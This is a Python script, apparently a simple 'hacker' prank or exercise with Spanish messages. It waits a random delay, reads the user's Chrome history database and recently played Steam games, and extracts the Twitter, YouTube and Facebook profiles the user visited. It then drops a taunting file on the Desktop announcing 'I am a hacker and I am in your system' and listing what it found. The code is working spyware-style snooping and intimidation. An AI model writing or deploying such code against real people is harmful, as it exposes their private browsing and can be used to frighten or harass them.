import os
from pathlib import Path
from time import sleep
from random import randrange
import sqlite3
import re
import glob

HACKER_FILE_NAME = "PARA TI.txt"


def get_user_path():
    return "{}/".format(Path.home())


def delay_action():
    n_hours = randrange(1, 4)
    print("Durmiendo {} horas".format(n_hours))
    sleep(n_hours)


def create_hacker_file(user_path):
    hacker_file = open(user_path + "Desktop/" + HACKER_FILE_NAME, "w")
    hacker_file.write("Hola, soy un hacker y estoy en tu sistema.\n")
    return hacker_file


def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
            conection = sqlite3.connect(history_path)
            cursor = conection.cursor()
            cursor.execute("SELECT title, last_visit_time, url From urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            print(urls)
            conection.close()
            return urls
        except sqlite3.OperationalError:
            print("Historial inaccesible, reintentando en 3 segundo...")
            sleep(3)


def check_twitter_profiles(hacker_file, chrome_history):
    profiles_twitter_visited = []
    for item in chrome_history[:20]:
        twitter_results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if twitter_results and twitter_results[0] not in ['notifications', 'home', 'explore', 'messages']:
            profiles_twitter_visited.append(twitter_results[0])
    hacker_file.write("He visto que has estado husmeando en los perfiles de {} \n".format(", ".join(profiles_twitter_visited)))


def check_youtube_profiles(hacker_file, chrome_history):
    profiles_youtube_visited = []
    for item in chrome_history[:20]:
        youtube_results = re.findall("([A-Za-z0-9]+)-Youtube", item[0])
        if youtube_results:
            profiles_youtube_visited.append(youtube_results[0])
    hacker_file.write("Tambien he visto que has visitado en youtube estas cosas {} \n".format(", ".join(profiles_youtube_visited)))


def check_facebook_profiles(hacker_file, chrome_history):
    profiles_facebook_visited = []
    for item in chrome_history[:20]:
        facebook_results = re.findall("https://www.facebook.com/([A-Za-z0-9]+.[A-Za-z0-9]+)", item[2])
        if facebook_results:
            profiles_facebook_visited.append(facebook_results[0])
    hacker_file.write("Ademas se que has visto los perfiles de {} en facebook \n".format(", ".join(profiles_facebook_visited)))


def check_steam_games(hacker_file, user_path):
    try:
        steam_path = user_path + "/Program Files (x86)/Steam/steamapps/common/*"
        games = []
        game_paths = glob.glob(steam_path)
        game_paths.sort(key=os.path.getmtime, reverse=True)
        for game_path in game_paths:
            games.append(game_path.split('/')[-1])
        hacker_file.write("Tambien se que juegas a {} en steam".format(",".join(games[:3])))
    except sqlite3.OperationalError:
        return


def main():
    delay_action()
    user_path = get_user_path()
    chrome_history = get_chrome_history(user_path)
    hacker_file = create_hacker_file(user_path)
    check_twitter_profiles(hacker_file, chrome_history)
    check_youtube_profiles(hacker_file, chrome_history)
    check_facebook_profiles(hacker_file, chrome_history)
    check_steam_games(hacker_file, user_path)


if __name__ == "__main__":
    main()
